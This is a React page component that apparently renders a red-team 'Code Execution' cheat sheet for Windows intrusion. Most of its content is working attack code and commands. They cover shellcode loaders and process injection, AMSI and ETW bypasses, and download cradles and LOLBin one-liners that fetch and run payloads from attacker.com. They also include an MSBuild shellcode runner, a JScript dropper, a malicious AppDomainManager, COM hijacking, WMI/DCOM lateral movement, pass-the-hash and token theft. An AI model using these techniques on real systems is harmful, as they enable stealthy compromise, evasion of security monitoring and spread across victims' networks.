import React from 'react';
import ArchitectureMap from '../components/ArchitectureMap';
import TechniqueCard from '../components/TechniqueCard';

const mapColumns = [
  {
    header: 'SHELLCODE & DLL',
    color: 'green',
    nodes: [
      { title: 'Shellcode Loaders', subtitle: 'Custom • Donut • sRDI', id: 'shellcode-loaders' },
      { title: 'Process Injection', subtitle: 'Classic • Syscall • Module Stomp', id: 'process-injection' },
      { title: 'Reflective DLL', subtitle: 'sRDI • in-memory PE load', id: 'reflective-dll' },
    ]
  },
  {
    header: 'MANAGED CODE',
    color: 'blue',
    nodes: [
      { title: 'PowerShell', subtitle: 'Cradle • Reflection • Runspace', id: 'powershell' },
      { title: '.NET / CLR', subtitle: 'Assembly.Load • inline execute', id: 'dotnet-clr' },
      { title: 'AppDomain Manager', subtitle: '.NET config hijack • runtime inject', id: 'appdomain' },
    ]
  },
  {
    header: 'LOLBINS & SCRIPTS',
    color: 'orange',
    nodes: [
      { title: 'LOLBins', subtitle: 'mshta • rundll32 • msbuild', id: 'lolbins' },
      { title: 'Script Engine Exec', subtitle: 'WSH • JScript • XSL • HTA', id: 'script-engine' },
      { title: 'COM Object Exec', subtitle: 'Hijack • ScriptMoniker • DDEAUTO', id: 'com-exec' },
    ]
  },
  {
    header: 'REMOTE & TOKEN',
    color: 'red',
    nodes: [
      { title: 'WMI / DCOM Exec', subtitle: 'wmiexec • DCOM lateral', id: 'wmi-dcom' },
      { title: 'Token & Alt Creds', subtitle: 'RunAs • token impersonate • PTH exec', id: 'token-exec' },
    ]
  },
];

const techniques = [
  // === GREEN group ===
  {
    id: 'shellcode-loaders',
    title: 'Shellcode Loaders',
    subtitle: 'Generate and load position-independent shellcode in memory',
    tags: ['Donut', 'sRDI', 'custom loader', 'AES encryption', 'PIC'],
    accentColor: 'green',
    overview: 'Shellcode loaders convert portable executables into position-independent shellcode and execute them entirely in memory, avoiding disk writes and static signatures. The core discipline is never allocating RWX memory directly — allocate RW, write, then flip to RX.',
    steps: [
      'Generate shellcode from a PE (EXE/DLL) using Donut or sRDI — produces position-independent shellcode (PIC)',
      'Encrypt the shellcode at rest (AES-256 or XOR) to evade static analysis and reduce entropy detection',
      'Write a custom loader: allocate RW memory → decrypt payload → change to RX → create thread',
      'Use indirect syscalls (SysWhispers3) for allocation and thread creation to avoid userland hooks',
      'Fetch shellcode from a remote URL at runtime and decrypt in memory to avoid static signatures',
    ],
    commands: [
      {
        title: 'Donut — convert EXE/DLL to shellcode',
        code: `# Donut — generate shellcode from EXE
donut -i beacon.exe -o beacon.bin -a 2 -e 3
# -a 2 = x64, -e 3 = AES encryption

# Donut from DLL
donut -i beacon.dll -o beacon.bin -a 2 -c EntryClass -m Main

# sRDI — convert DLL to PIC shellcode
python3 ConvertToShellcode.py beacon.dll
# Output: beacon.bin (position-independent, reflective)`
      },
      {
        title: 'Simple C++ shellcode loader (RW → RX)',
        code: `#include <windows.h>

// Read shellcode from file or embed as byte array
LPVOID mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
memcpy(mem, shellcode, shellcode_len);

DWORD old;
VirtualProtect(mem, shellcode_len, PAGE_EXECUTE_READ, &old);

HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
WaitForSingleObject(hThread, INFINITE);`
      }
    ]
  },
  {
    id: 'process-injection',
    title: 'Process Injection',
    subtitle: 'Inject code into remote processes for execution and evasion',
    tags: ['VirtualAllocEx', 'NtCreateThreadEx', 'module stomping', 'threadless', 'WriteProcessMemory'],
    accentColor: 'green',
    overview: 'Process injection places shellcode or a DLL into a remote process to execute code under that process\'s identity and network context, blending C2 traffic with legitimate applications.',
    steps: [
      'Select a target process with a plausible network profile (browser, svchost) to blend C2 traffic',
      'Open the target process with minimum required access (PROCESS_VM_WRITE | PROCESS_CREATE_THREAD)',
      'Allocate RW memory in the target — never allocate RWX directly',
      'Write shellcode to the remote buffer with WriteProcessMemory',
      'Flip memory protection to RX with VirtualProtectEx before triggering execution',
      'Create a remote thread via NtCreateThreadEx (syscall) to avoid CreateRemoteThread hooks',
      'For stealth: use module stomping to overwrite a loaded DLL\'s .text section instead of allocating new memory',
    ],
    commands: [
      {
        title: 'Classic remote process injection (C++)',
        code: `// Target process — inject into explorer.exe
DWORD pid = GetProcessIdByName(L"explorer.exe");
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

// Allocate RW, write, then protect RX
LPVOID remote = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(hProc, remote, shellcode, sc_len, NULL);

DWORD old;
VirtualProtectEx(hProc, remote, sc_len, PAGE_EXECUTE_READ, &old);

HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
WaitForSingleObject(hThread, INFINITE);
CloseHandle(hThread);
CloseHandle(hProc);`
      },
      {
        title: 'Module stomping — overwrite loaded DLL text section',
        code: `// Find a suitable DLL loaded into the target process
// e.g. a rarely-used DLL like xpsprint.dll
// Overwrite its .text section with shellcode

// 1. Get module base in remote process
HMODULE hMod = GetRemoteModuleBase(hProc, L"xpsprint.dll");
// If not loaded, LoadLibraryEx it first with DONT_RESOLVE_DLL_REFERENCES

// 2. Parse PE headers to find .text section RVA
// 3. VirtualProtectEx to RW
// 4. WriteProcessMemory shellcode at .text base
// 5. VirtualProtectEx back to RX
// 6. CreateRemoteThread at .text base`
      }
    ]
  },
  {
    id: 'reflective-dll',
    title: 'Reflective DLL Loading',
    subtitle: 'Load DLLs entirely in memory without touching disk',
    tags: ['sRDI', 'reflective loading', 'PE parsing', 'in-memory', 'ReflectiveDLLInjection'],
    accentColor: 'green',
    overview: 'Reflective DLL loading allows a DLL to map itself into memory without ever calling LoadLibrary, leaving no entry in the PEB module list and no backing file path on disk.',
    steps: [
      'Convert the DLL to position-independent shellcode with sRDI — the output self-maps and calls DllMain',
      'Allocate memory in the target process (RW), write the sRDI shellcode bytes',
      'Flip memory to RX and create a thread at the shellcode entry point',
      'The shellcode parses its own PE headers, maps sections, resolves imports, and calls DllMain — no LoadLibrary involved',
      'Use Invoke-ReflectivePEInjection from PowerShell for rapid in-memory DLL injection during engagements',

    ],
    commands: [
      {
        title: 'sRDI — convert DLL to reflective shellcode',
        code: `# sRDI — convert DLL to PIC shellcode
git clone https://github.com/monoxgas/sRDI
python3 ShellcodeRDI.py beacon.dll
# Output: beacon.bin — self-loading shellcode

# With function hash (call specific export after load)
python3 ShellcodeRDI.py beacon.dll --function-name Execute --userdata "args"

# Inject via any shellcode loader
# Allocate → Write beacon.bin → RX → CreateThread`
      },
      {
        title: 'Invoke-ReflectivePEInjection (PowerSploit)',
        code: `# Inject DLL into remote process from PowerShell
Import-Module PowerSploit\CodeExecution\Invoke-ReflectivePEInjection.ps1

# Load DLL into current process
$bytes = [IO.File]::ReadAllBytes('beacon.dll')
Invoke-ReflectivePEInjection -PEBytes $bytes -FuncReturnType WString

# Inject into remote PID
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId 1234`
      }
    ]
  },
  // === BLUE group ===
  {
    id: 'powershell',
    title: 'PowerShell Execution',
    subtitle: 'In-memory execution via download cradles, reflection, and runspaces',
    tags: ['cradle', 'reflection', 'AMSI bypass', 'runspace', 'constrained language', 'CLM bypass'],
    accentColor: 'blue',
    overview: 'PowerShell offers multiple in-memory execution primitives that avoid spawning powershell.exe. Always bypass AMSI before loading any tooling — a single missed bypass will burn the session.',
    steps: [
      'Bypass AMSI first before loading any payload — patch amsiInitFailed or AmsiScanBuffer',
      'Use a download cradle to fetch and execute the payload from memory: IEX(New-Object Net.WebClient).DownloadString(...)',
      'Check the language mode: $ExecutionContext.SessionState.LanguageMode — if ConstrainedLanguage, switch to a CLR-based execution path',
      'If Script Block Logging is a concern, patch ETW before running the payload',
      'For stealth, host a C# Runspace in-process to execute PowerShell without spawning powershell.exe',
      'As a fallback, attempt a PowerShell v2 downgrade which has no AMSI or Script Block Logging',

    ],
    commands: [
      {
        title: 'Download cradles and AMSI bypass',
        code: `# Basic download cradle
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

# BITS-based cradle (evades some controls)
IEX(New-Object Net.WebClient).DownloadString((New-Object Net.WebClient).DownloadString('http://attacker.com/url.txt'))

# Invoke-WebRequest cradle
IEX(Invoke-WebRequest -Uri 'http://attacker.com/payload.ps1' -UseBasicParsing).Content

# AMSI bypass — reflection (common)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') | % {
    $_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
}

# AMSI bypass — patch AmsiScanBuffer (requires admin or specific conditions)
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static')
$c=$b.GetValue($null)
[IntPtr]$d=[Int64]$c+0x8
$e=[System.Runtime.InteropServices.Marshal]::ReadInt32($d)
[System.Runtime.InteropServices.Marshal]::WriteInt32($d, [Int32](0x80070057))

# PowerShell v2 downgrade (no AMSI, no ScriptBlock logging)
powershell -Version 2 -NoProfile -ExecutionPolicy Bypass -Command "IEX(...)"`
      },
      {
        title: 'C# Runspace — execute PowerShell without powershell.exe',
        code: `using System.Management.Automation;
using System.Management.Automation.Runspaces;

Runspace rs = RunspaceFactory.CreateRunspace();
rs.Open();
PowerShell ps = PowerShell.Create();
ps.Runspace = rs;

// AMSI bypass first
ps.AddScript("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)");
ps.Invoke();
ps.Commands.Clear();

// Execute payload
ps.AddScript(File.ReadAllText("payload.ps1"));
var results = ps.Invoke();
rs.Close();`
      }
    ]
  },
  {
    id: 'dotnet-clr',
    title: '.NET / CLR Execution',
    subtitle: 'In-process .NET assembly execution via CLR hosting and Assembly.Load',
    tags: ['Assembly.Load', 'inline-execute', 'execute-assembly', 'CLR hosting', 'Cobalt Strike'],
    accentColor: 'blue',
    overview: '.NET assemblies can be loaded entirely from a byte array with Assembly.Load, enabling in-memory execution of offensive tools without touching disk. ETW patching before load prevents assembly load events from being captured.',
    steps: [
      'Patch ETW (EtwEventWrite) before loading any assembly to suppress .NET load telemetry',
      'Fetch the assembly bytes over HTTPS into a byte array — never write to disk',
      'Load in-memory with Assembly.Load(bytes) and invoke the entry point via reflection',
      'In Cobalt Strike, use execute-assembly for fork-and-run (safer) or inline-execute-assembly BOF for stealthier in-process execution',
      'Use CLR hosting in an unmanaged C++ injector (ICLRRuntimeHost) to load .NET inside any process',

    ],
    commands: [
      {
        title: 'Cobalt Strike — execute-assembly',
        code: `# Fork-and-run (default) — spawns SpawnTo process, injects CLR, runs assembly
execute-assembly /opt/tools/Seatbelt.exe -group=user

# Inline execute-assembly (BOF) — runs in Beacon process
# Requires inline-execute-assembly BOF from TrustedSec
inline-execute-assembly Seatbelt.exe -group=system

# Sliver — execute-assembly
execute-assembly --timeout 60 Seatbelt.exe -group=all`
      },
      {
        title: 'C# — Assembly.Load in-memory execution',
        code: `using System.Reflection;

// Fetch assembly bytes from remote URL
byte[] assemblyBytes;
using (var wc = new System.Net.WebClient())
    assemblyBytes = wc.DownloadData("http://attacker.com/tool.exe");

// Patch ETW before loading
// PatchETW();  // optional — patch EtwEventWrite

// Load and invoke
Assembly asm = Assembly.Load(assemblyBytes);
MethodInfo entry = asm.EntryPoint;
entry.Invoke(null, new object[] { new string[] { "-group=all" } });`
      }
    ]
  },
  {
    id: 'appdomain',
    title: 'AppDomain Manager Injection',
    subtitle: 'Hijack .NET runtime configuration to execute code inside any .NET application',
    tags: ['AppDomainManager', '.config hijack', 'APPDOMAIN_MANAGER_ASM', 'CLR injection', '.NET hijack'],
    accentColor: 'blue',
    overview: 'AppDomain Manager injection abuses the .NET CLR configuration mechanism to silently load a malicious DLL into any .NET application at startup — no process injection required.',
    steps: [
      'Drop a malicious <app>.exe.config alongside a target .NET executable, declaring AppDomainManagerAssembly and AppDomainManagerType',
      'Alternatively, set the APPDOMAIN_MANAGER_ASM and APPDOMAIN_MANAGER_TYPE environment variables before launching any .NET process',
      'Compile the custom AppDomainManager DLL — InitializeNewDomain() runs automatically when the CLR starts',
      'Execute your payload inside InitializeNewDomain() — runs in the context of the target process with no injection APIs called',
      'Target persistent .NET processes (WMI Provider Host, PowerShell) for long-lived execution',

    ],
    commands: [
      {
        title: 'AppDomain Manager — config hijack',
        code: `<!-- target.exe.config — place alongside the .NET EXE -->
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilManager.Manager" />
  </runtime>
</configuration>`
      },
      {
        title: 'Custom AppDomainManager DLL (C#)',
        code: `// EvilManager.cs — compiled to EvilManager.dll
using System;
using System.Runtime.InteropServices;

namespace EvilManager {
    public class Manager : AppDomainManager {
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
            // Execute payload when any .NET app loads
            System.Diagnostics.Process.Start("cmd.exe", "/c powershell -enc BASE64_PAYLOAD");
            base.InitializeNewDomain(appDomainInfo);
        }
    }
}

// Compile:
// csc /target:library /out:EvilManager.dll EvilManager.cs

// Environment variable method (no config file):
// APPDOMAIN_MANAGER_ASM=EvilManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// APPDOMAIN_MANAGER_TYPE=EvilManager.Manager`
      }
    ]
  },
  // === ORANGE group ===
  {
    id: 'lolbins',
    title: 'LOLBins — Living Off the Land Binaries',
    subtitle: 'Abuse legitimate Windows binaries for execution and bypass',
    tags: ['mshta', 'rundll32', 'msbuild', 'regsvr32', 'certutil', 'wmic', 'LOLBAS'],
    accentColor: 'orange',
    overview: 'LOLBins are signed Microsoft binaries that can execute arbitrary code as a side effect of their intended function. They bypass application whitelisting controls that trust Microsoft-signed executables.',
    steps: [
      'Identify which LOLBin is available and not blocked: mshta, rundll32, msbuild, regsvr32, certutil, wmic',
      'Use mshta.exe to execute a remote HTA file — supports VBScript/JScript and COM objects',
      'Use regsvr32 /s /n /u /i:<URL> scrobj.dll to execute a remote COM scriptlet (squiblydoo)',
      'Use msbuild.exe to compile and run inline C# tasks from an XML project file, bypassing AppLocker',
      'Use certutil.exe to download files from a URL when other download methods are blocked',
      'Use wmic.exe with /format: to execute arbitrary JScript from a remote XSL file',

    ],
    commands: [
      {
        title: 'Common LOLBin execution techniques',
        code: `# mshta — execute remote HTA
mshta.exe http://attacker.com/payload.hta
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""payload.exe"":close")

# rundll32 — execute DLL export
rundll32.exe beacon.dll,EntryPoint

# rundll32 — COM scriptlet (squiblydoo)
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker.com/payload.sct")

# regsvr32 — remote COM scriptlet (squiblydoo)
regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# msbuild — inline C# task execution
msbuild.exe evil.xml

# certutil — download file
certutil.exe -urlcache -split -f http://attacker.com/beacon.exe beacon.exe

# wmic — XSL execution
wmic os get /format:"http://attacker.com/evil.xsl"

# installutil — bypass AppLocker + execute .NET
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /logtoconsole=false /U beacon.exe`
      },
      {
        title: 'MSBuild inline C# task (evil.xml)',
        code: `<!-- evil.xml — msbuild inline task execution -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Exec">
    <ClassicTask />
  </Target>
  <UsingTask TaskName="ClassicTask" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs"><![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassicTask : Task, ITask {
          [DllImport("kernel32.dll")]
          static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
          [DllImport("kernel32.dll")]
          static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr id);
          [DllImport("kernel32.dll")]
          static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);
          public override bool Execute() {
            byte[] sc = new byte[] { /* shellcode bytes */ };
            IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
            Marshal.Copy(sc, 0, mem, sc.Length);
            IntPtr t = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(t, 0xFFFFFFFF);
            return true;
          }
        }
      ]]></Code>
    </Task>
  </UsingTask>
</Project>`
      }
    ]
  },
  {
    id: 'script-engine',
    title: 'Script Engine Execution',
    subtitle: 'Execute arbitrary code via Windows script engines — WSH, JScript, XSL, HTA',
    tags: ['WSH', 'JScript', 'VBScript', 'cscript', 'wscript', 'XSLT', 'HTA', 'mshta', 'RegSvr32 sct'],
    accentColor: 'orange',
    overview: 'Windows script engines (WSH, JScript, HTA, XSL) are built-in, signed, and typically whitelisted. They provide full COM object access including file system, network, and process APIs without needing compiled binaries.',
    steps: [
      'Choose the appropriate engine based on what is available: wscript/cscript for VBS/JS, mshta for HTA, wmic for XSL',
      'Write a JScript payload using MSXML2.ServerXMLHTTP and ADODB.Stream to download and execute a binary',
      'Deliver HTA via email link or phishing page — double-click executes via mshta.exe with full COM access',
      'Use wmic process list /format:<URL> or msxsl.exe to execute XSLT stylesheets containing embedded JScript',
      'Use SCT scriptlets via regsvr32 moniker for fileless COM-based execution',

    ],
    commands: [
      {
        title: 'WSH / JScript / HTA execution',
        code: `# VBScript execution via wscript (GUI)
wscript.exe payload.vbs

# VBScript via cscript (console)
cscript.exe payload.vbs

# JScript execution
cscript.exe //E:jscript payload.js

# HTA via mshta
mshta.exe payload.hta
mshta.exe http://attacker.com/payload.hta

# XSL execution via wmic
wmic process list /format:"http://attacker.com/evil.xsl"

# XSL via msxsl.exe (requires download)
msxsl.exe data.xml http://attacker.com/evil.xsl

# SCT scriptlet via regsvr32 (squiblydoo)
regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll`
      },
      {
        title: 'JScript payload template',
        code: `// payload.js — JScript download and execute
var shell = new ActiveXObject("WScript.Shell");
var wc = new ActiveXObject("MSXML2.ServerXMLHTTP");
wc.open("GET", "http://attacker.com/beacon.exe", false);
wc.send();

// Write to disk
var stream = new ActiveXObject("ADODB.Stream");
stream.Type = 1;  // binary
stream.Open();
stream.Write(wc.responseBody);
stream.SaveToFile("C:\\Users\\Public\\svc.exe", 2);
stream.Close();

// Execute
shell.Run("C:\\Users\\Public\\svc.exe", 0, false);`
      }
    ]
  },
  {
    id: 'com-exec',
    title: 'COM Object Execution & Hijacking',
    subtitle: 'Abuse COM infrastructure for stealthy code execution and persistence',
    tags: ['COM hijack', 'CLSID', 'ScriptMoniker', 'DDEAUTO', 'registry hijack', 'IFileOperation'],
    accentColor: 'orange',
    overview: 'COM provides a legitimate DLL loading mechanism that can be hijacked at the per-user registry level without admin rights. When an application instantiates a COM object, your DLL loads instead of the real one.',
    steps: [
      'Run ProcMon filtered on HKCU CLSID registry lookups with result "NAME NOT FOUND" to find hijackable CLSIDs',
      'Identify a CLSID that is loaded by a frequently-running application (Explorer, Outlook, Teams)',
      'Create the HKCU\\Software\\Classes\\CLSID\\{GUID}\\InProcServer32 key pointing to your malicious DLL',
      'Set ThreadingModel to "Apartment" to match the expected COM threading model',
      'Wait for the target application to load the COM object — your DLL executes in its process context',

    ],
    commands: [
      {
        title: 'COM hijacking — HKCU registry method',
        code: `# Find hijackable COM entries using ProcMon
# Filter: Operation = RegOpenKey, Result = NAME NOT FOUND
# Path contains HKCU\Software\Classes\CLSID\

# Example: hijack {CLSID} for a frequently-used COM object
$clsid = "{YOUR-TARGET-CLSID}"
$regPath = "HKCU:\Software\Classes\CLSID\$clsid\InProcServer32"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\Users\Public\beacon.dll"
Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment"

# Verify
Get-ItemProperty -Path $regPath

# When target app loads the COM object, your DLL executes
# Example target CLSIDs:
# {b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} — CPLS
# {BCDE0395-E52F-467C-8E3D-C4579291692E} — MMDeviceEnumerator (audio)`
      }
    ]
  },
  // === RED group ===
  {
    id: 'wmi-dcom',
    title: 'WMI / DCOM Execution',
    subtitle: 'Remote execution via Windows Management Instrumentation and DCOM',
    tags: ['wmiexec', 'DCOM', 'MMC20', 'ShellWindows', 'Win32_Process', 'lateral movement'],
    accentColor: 'red',
    overview: 'WMI and DCOM allow code execution on remote hosts using legitimate Windows management protocols. They generate fewer logs than PSExec or WinRM and are often permitted through internal firewalls.',
    steps: [
      'Open a WMI connection to the target using explicit credentials or Pass-the-Hash',
      'Create a remote process via Win32_Process.Create — command runs as the authenticated user',
      'Use DCOM MMC20.Application as an alternative: CoCreateInstance remotely → ExecuteShellCommand',
      'Use DCOM ShellWindows for a second DCOM lateral movement path that avoids MMC',
      'For stealth: prefer WMI event subscriptions over direct process creation — they run on a trigger and leave minimal immediate logs',
      'In Cobalt Strike, use jump wmi or jump dcom-mmc20 to automate lateral movement',

    ],
    commands: [
      {
        title: 'WMI remote execution',
        code: `# Impacket wmiexec — interactive shell via WMI
python3 wmiexec.py DOMAIN/user:pass@target.com

# wmiexec with PTH
python3 wmiexec.py -hashes :NTLM_HASH DOMAIN/user@target.com

# PowerShell WMI remote process creation
$wmi = [wmiclass]"\\\\target.com\\root\\cimv2:Win32_Process"
$wmi.Create("powershell.exe -nop -w hidden -enc BASE64_PAYLOAD")

# Cobalt Strike — WMI lateral movement
jump wmi target.com HTTPS-Listener
# or
remote-exec wmi target.com cmd.exe /c whoami`
      },
      {
        title: 'DCOM lateral movement — MMC20',
        code: `# PowerShell DCOM via MMC20.Application
$dcom = [System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID("MMC20.Application","target.com"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c powershell -enc BASE64_PAYLOAD", "7")

# DCOM ShellWindows
$dcom = [System.Activator]::CreateInstance([System.Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target.com"))
$item = $dcom.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c powershell -enc BASE64","C:\Windows\System32",$null,0)

# Cobalt Strike DCOM jump
jump dcom-mmc20 target.com HTTPS-Listener
jump dcom-shellwindows target.com HTTPS-Listener`
      }
    ]
  },
  {
    id: 'token-exec',
    title: 'Token Manipulation & Alternate Credential Execution',
    subtitle: 'Execute payloads under different user contexts using token duplication and credential APIs',
    tags: ['runas', 'CreateProcessWithToken', 'ImpersonateLoggedOnUser', 'PTH exec', 'token duplication', 'Overpass-the-Hash'],
    accentColor: 'red',
    overview: 'Token manipulation and alternate credential APIs allow executing code under a different user\'s identity. This is essential for moving laterally using recovered credentials or stolen tokens without knowing plaintext passwords.',
    steps: [
      'Use runas /netonly to spawn a process that uses supplied credentials only for network authentication',
      'Steal a token from a privileged running process using steal_token (Cobalt Strike) or OpenProcessToken + DuplicateToken',
      'Use CreateProcessWithTokenW to spawn a new process under the duplicated token context',
      'Use make_token with plaintext credentials to create a logon session for network auth without spawning a new process',
      'Use Rubeus asktgt with an NTLM hash (Overpass-the-Hash) to obtain a real Kerberos TGT for seamless lateral movement',
      'Revert to original token after completing the operation: rev2self',

    ],
    commands: [
      {
        title: 'Token manipulation and alternate execution',
        code: `# runas with saved credentials
runas /savecred /user:DOMAIN\\user cmd.exe

# runas /netonly — use credentials for network auth only
runas /netonly /user:DOMAIN\\user powershell.exe

# Cobalt Strike — token operations
make_token DOMAIN\\user Password123    # Create token (network auth only)
steal_token <PID>                     # Steal token from process
rev2self                              # Revert to original token

# Cobalt Strike — spawn as different user
spawn DOMAIN\\user Password123 HTTPS-Listener

# Rubeus — Overpass-the-Hash (get TGT using NTLM hash)
Rubeus.exe asktgt /user:targetuser /rc4:NTLM_HASH /ptt
# /ptt — pass-the-ticket into current session
# Then: klist to verify, dir \\server\share to test

# Impacket — PTH execution
python3 psexec.py -hashes :NTLM_HASH DOMAIN/user@target
python3 wmiexec.py -hashes :NTLM_HASH DOMAIN/user@target`
      }
    ]
  },
];

export default function Execution() {
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };
  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">Code </span><span className="text-emerald-400">Execution</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">Shellcode Loaders • Process Injection • LOLBins • .NET/CLR • Script Engines</p>
      </div>
      <ArchitectureMap columns={mapColumns} onNodeClick={scrollTo} />
      <div className="border-t border-slate-800/50 pt-10 grid grid-cols-1 gap-4">
        {techniques.map((t) => (
          <div key={t.id} id={t.id}>
            <TechniqueCard title={t.title} subtitle={t.subtitle} tags={t.tags} accentColor={t.accentColor} overview={t.overview} steps={t.steps} commands={t.commands} />
          </div>
        ))}
      </div>
    </div>
  );
}